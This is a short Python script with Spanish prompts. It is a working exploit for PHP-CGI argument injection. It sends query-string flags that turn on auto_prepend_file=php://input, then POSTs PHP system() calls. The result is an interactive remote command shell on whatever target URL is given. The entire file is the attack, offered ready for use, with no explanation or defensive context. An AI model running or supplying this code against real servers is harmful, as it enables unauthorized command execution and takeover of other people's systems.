#/usr/bin/env python
#_*_ coding: utf-8 _*_


import requests
import argparse


parser = argparse.ArgumentParser()
parser.add_argument('-t','--target',help="Objetivo")
parser = parser.parse_args()


def main(): 
	
	if parser.target: 
		vuln = "/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
		target = parser.target
		if not target.startswith("http://"):
			target = "http://" + target 

		try: 
			exp = requests.post(target + vuln, "<?php system('whoami'); die(); ?>")
			user = exp.text
			user = user.replace("\n","")
			try: 
				while True: 
					comando = input("{}$: ".format(user))
					exp = requests.post(target + vuln , "<?php  system('{}'); die(); ?>".format(comando))
					print(exp.text)
			except KeyboardInterrupt: 
				exit() 



		except: 
			print("Fallo al conectar")

		
				
	else: 
		print("Introduce un objetivo")




if __name__ == '__main__':
	try: 
		main() 
	except KeyboardInterrupt: 
		exit() 
